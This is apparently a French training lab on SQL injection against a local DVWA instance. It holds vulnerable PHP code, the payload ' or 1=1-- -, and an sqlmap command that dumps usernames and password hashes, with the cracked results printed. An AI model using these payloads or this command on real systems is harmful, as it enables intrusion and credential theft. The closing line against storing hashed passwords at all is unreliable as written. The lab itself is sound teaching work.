# TP - formation sécu n°1

## Installation

```bash
    docker pull astronaut1712/dvwa
    docker pull googlesky/sqlmap
    docker run -p 80:80 astronaut1712/dvwa
```

## Démarrage

1. se connecter sur http://localhost/
2. create/reset database
3. s'identifier (admin / password)
4. aller sur la page [SQL injection](http://localhost/vulnerabilities/sqli/)

## Injection SQL

### Le code fautif

```php
    $id = $_REQUEST['id'];
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysql_query($query);
```

1. récupération d'un *query param* "id"
2. construction d'une requête SQL qui demande le prénom et le nom de l'utilisateur correspondant à l'id
3. exécution de la requête

### Utilisation normale

Saisir `5` dans le formulaire.
> `id = 5`
>
>```sql
>$query  = "SELECT first_name, last_name FROM users WHERE user_id = '5';";
>```
>
> La requête SQL envoyée à la base de donnée sera :
>> `SELECT first_name, last_name FROM users WHERE user_id = '5';`

### Détection de l'existence de la faille

Lorsque l'on saisit `'` dans le formulaire (juste une quote simple / une apostrophe), on obtient une erreur.

> `id = '`
>
>```sql
>$query  = "SELECT first_name, last_name FROM users WHERE user_id = ''';";
>```
>
> La requête SQL envoyée à la base de donnée sera :
>> `SELECT first_name, last_name FROM users WHERE user_id = ''';`

### Exploitation manuelle de la faille

> Par exemple, si `id = ' or 1=1-- -` (avec l'apostrophe et le "moins" à la fin)
>
>```sql
>$query = "SELECT first_name, last_name FROM users WHERE user_id = '' or 1=1-- -';";
>-------------------------------------------------------------------|__________|
>```
>
> La requête SQL envoyée à la base de donnée sera :
>> `SELECT first_name, last_name FROM users WHERE user_id = '' or 1=1`

1. la quote ferme la première chaîne de caractères
2. `or 1=1` est une condition toujours vraie
3. tout ce qui est après `--` est ignoré (commentaires)

### Exploitation automatisée

1. avec les DevTools -> storage -> cookies -> récupérer le PHPSESSID
2. lancer sqlmap en lui donnant le votre PHPSESSID

    >```bash
    >docker run --rm -it -v /tmp/sqlmap:/root/.sqlmap/ paoloo/sqlmap -u "http://host.docker.internal/vulnerabilities/sqli/?id=1&Submit=Submit" \
    >   --cookie="PHPSESSID=crtiv3rujjvauflnodmeqk6uc5; security=low" --batch \
    >   -D dvwa -T users -C user,password --dump
    >```

3. les résultats obtenus sont :

    >```code
    >+---------+---------------------------------------------+
    >| user    | password                                    |
    >+---------+---------------------------------------------+
    >| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
    >| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
    >| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
    >| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
    >| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
    >+---------+---------------------------------------------+
    >```

4. essayer avec `--dump-all --all`
5. recherchez `8d3533d75ae2c3966d7e0d4fcc69216b` ou les autres hash de mots de passe sur google

## Conclusions

1. il s'agit d'un cas simple, délibérément vulnérable, pour que l'exercice reste simple
1. une injection SQL permet d'exécuter des requêtes SQL sur la base de données
![Bobby Tables](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)
1. les répercutions peuvent être assez inattendues. Ici on peut récupérer :
    * les mots de passe des utilisateurs alors que le code php n'y fait pas référence
    * l'ensemble des bases de données du serveur
    * les droits des utilisateurs
1. il ne faut JAMAIS stocker des mots de passe hashés (md5 au autres)
1. voir <https://owasp.org/www-project-top-ten/>
